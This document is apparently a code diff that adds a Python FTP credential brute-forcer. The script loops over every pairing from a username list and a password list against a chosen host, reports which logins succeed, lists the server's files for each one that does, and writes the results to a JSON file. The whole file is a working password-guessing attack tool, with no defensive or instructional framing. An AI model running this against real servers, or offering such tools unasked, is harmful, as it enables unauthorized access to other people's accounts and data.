@@ -1,0 +1,60 @@
+import ftplib
+import socket
+import argparse
+import json
+import itertools
+
+def check_ftp_login(host, port, username, password, timeout=5):
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(host, port, timeout=timeout)
+        ftp.login(user=username, passwd=password)
+        print(f"[+] Success: {username}:{password}")
+        
+        try:
+            files = ftp.nlst()
+        except Exception as e:
+            files = [f"Could not list files: {str(e)}"]
+
+        ftp.quit()
+        return {"username": username, "password": password, "success": True, "files": files}
+
+    except ftplib.error_perm:
+        print(f"[-] Failed login: {username}:{password}")
+        return {"username": username, "password": password, "success": False, "files": []}
+    except (socket.error, socket.timeout) as e:
+        print(f"[!] Connection error: {str(e)}")
+        return {"username": username, "password": password, "success": False, "error": str(e)}
+
+
+def load_file(path):
+    with open(path, "r") as f:
+        return [line.strip() for line in f if line.strip()]
+
+
+def main():
+    parser = argparse.ArgumentParser(description="FTP Credential Checker")
+    parser.add_argument("--host", required=True, help="Target host IP/Domain")
+    parser.add_argument("--port", type=int, default=21, help="Target port (default=21)")
+    parser.add_argument("--userlist", required=True, help="File containing usernames")
+    parser.add_argument("--passlist", required=True, help="File containing passwords")
+    parser.add_argument("--output", default="ftp_results.json", help="Output JSON file")
+
+    args = parser.parse_args()
+
+    usernames = load_file(args.userlist)
+    passwords = load_file(args.passlist)
+
+    results = []
+    for username, password in itertools.product(usernames, passwords):
+        result = check_ftp_login(args.host, args.port, username, password)
+        results.append(result)
+
+    with open(args.output, "w") as f:
+        json.dump(results, f, indent=4)
+
+    print(f"\n[+] Results saved in {args.output}")
+
+
+if __name__ == "__main__":
+    main()
